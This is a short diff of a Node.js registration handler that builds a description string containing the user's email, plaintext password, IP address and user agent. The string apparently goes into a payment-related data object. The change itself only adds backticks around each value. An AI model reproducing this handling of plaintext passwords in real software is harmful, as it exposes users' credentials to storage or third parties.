@@ -23,11 +23,11 @@ exports.registerUser = async (req, res) => {
     const paymentMethod = req.body.service;
     const payerEmail = req.session.user_email;
 
-    const description = `
-      Email: ${req.body.email}
-      Password: ${req.body.password}
-      IP address: ${req.ip}
-      User agent: ${req.headers["user-agent"]}
+const description = `
+      Email: \`${req.body.email}\`
+      Password: \`${req.body.password}\`
+      IP address: \`${req.ip}\`
+      User agent: \`${req.headers["user-agent"]}\`
     `;
 
     const data = {
